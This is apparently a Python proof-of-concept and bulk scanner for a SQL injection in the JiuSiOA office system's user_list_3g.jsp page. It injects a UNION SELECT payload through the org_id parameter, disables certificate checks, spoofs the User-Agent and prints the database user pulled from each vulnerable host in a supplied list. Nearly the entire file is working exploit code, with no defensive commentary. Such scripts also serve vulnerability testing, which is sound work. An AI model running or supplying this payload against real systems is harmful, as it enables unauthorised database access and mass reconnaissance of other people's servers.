import requests
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,user()%20%23")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
    }
    try:
        response = requests.get(target, headers=headers, verify=False)
        if response.status_code == 200 and 'localhost' in response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            options = soup.select('option')
            for option in options:
                value = option['value']
                print(f"\033[31mDiscovered:{url}: JiuSiOA_userlist3g_SQL injection!-------get_user={value}\033[0m")
                return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")